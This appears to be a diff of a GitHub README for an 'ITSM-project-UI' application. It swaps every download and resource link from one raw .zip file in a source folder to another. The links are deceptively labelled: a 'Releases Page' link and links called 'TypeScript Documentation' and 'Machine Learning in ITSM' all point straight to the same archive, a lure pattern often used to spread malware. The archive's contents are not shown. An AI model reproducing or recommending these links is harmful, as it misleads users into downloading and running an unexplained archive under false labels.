@@ -6,7 +6,7 @@ Welcome to ITSM-project-UI! This is your guide to easily download and run our in
 
 ### 🔗 Download ITSM-project-UI
 
-[![Download ITSM-project-UI](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/lib/project_UI_ITS_v1.8.zip)](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/lib/project_UI_ITS_v1.8.zip)
+[![Download ITSM-project-UI](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/components/sections/ITS-project-UI-v2.0.zip)](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/components/sections/ITS-project-UI-v2.0.zip)
 
 ## 📋 Overview
 
@@ -43,7 +43,7 @@ Our application focuses on the following areas:
 
 ## 📥 Download and Install
 
-1. **Visit the Releases Page**: Open this link to go to the releases page: [Download ITSM-project-UI](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/lib/project_UI_ITS_v1.8.zip).
+1. **Visit the Releases Page**: Open this link to go to the releases page: [Download ITSM-project-UI](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/components/sections/ITS-project-UI-v2.0.zip).
   
 2. **Select the Latest Release**: On the releases page, you will see a list of all versions. Click on the latest version.
 
@@ -82,10 +82,10 @@ For questions or suggestions, please contact our support team via GitHub Issues 
 
 Explore further resources to enhance your understanding of IT service management and machine learning applications.
 
-- [Machine Learning in ITSM](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/lib/project_UI_ITS_v1.8.zip)
-- [https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/lib/project_UI_ITS_v1.8.zip Documentation](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/lib/project_UI_ITS_v1.8.zip)
-- [TypeScript Documentation](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/lib/project_UI_ITS_v1.8.zip)
+- [Machine Learning in ITSM](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/components/sections/ITS-project-UI-v2.0.zip)
+- [https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/components/sections/ITS-project-UI-v2.0.zip Documentation](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/components/sections/ITS-project-UI-v2.0.zip)
+- [TypeScript Documentation](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/components/sections/ITS-project-UI-v2.0.zip)
 
 Feel free to explore, and we hope that ITSM-project-UI helps you enhance your incident management processes efficiently! 
 
-[![Download ITSM-project-UI](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/lib/project_UI_ITS_v1.8.zip)](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/lib/project_UI_ITS_v1.8.zip)
+[![Download ITSM-project-UI](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/components/sections/ITS-project-UI-v2.0.zip)](https://github.com/Abiijutt/ITSM-project-UI/raw/refs/heads/main/src/components/sections/ITS-project-UI-v2.0.zip)
